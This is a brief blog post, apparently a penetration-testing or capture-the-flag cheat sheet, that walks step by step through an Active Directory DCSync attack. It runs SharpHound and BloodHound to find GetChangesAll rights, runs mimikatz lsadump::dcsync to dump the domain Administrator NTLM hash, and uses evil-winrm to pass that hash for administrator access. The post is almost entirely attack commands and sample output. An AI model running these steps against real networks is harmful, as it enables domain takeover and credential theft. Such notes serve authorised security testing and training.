---
layout: post
title:  "ad - windows - dcsync getchangesall"
date:   2022-01-01
categories: windows
---


## AD - DCSync - GetChangesAll


### Target


```powershell

PS C:\Users\user\Documents> upload /home/kali/privesc/SharpHound.ps1

PS C:\Users\user\Documents> .\SharpHound.ps1

PS C:\Users\user\Documents> Invoke-BloodHound -CollectionMethod All

or 

PS C:\Users\user\Documents> Invoke-BloodHound -CollectionMethod All -Domain DC0.EXAMPLE.LOCAL -ZipFilename dc.zip

```

### Kali


```bash

sudo neo4j console
bloodhound
```

### Bloodhound Enumeration - GetChangesAll

```text


Select the current user -> Node Info -> First Degree Object Control -> GetChangesAll

```

### Back to Target


```powershell

PS C:\Users\user\Documents> upload /home/kali/privesc/mimikatz.exe
PS C:\Users\user\Documents> .\mimikatz.exe "lsadump::dcsync /domain:EXAMPLE.LOCAL /user:Administrator" exit

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 02/07/2020 05:27:04
Object Security ID   : S-1-5-21-<REDACTED>-<REDACTED>-<REDACTED>-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: <NTML HASH VALUE WE WANT>


```

### Evil-Winrm

```powershell

evil-winrm -i 127.0.0.1  -u administrator -H <NTML HASH VALUE WE WANT>

```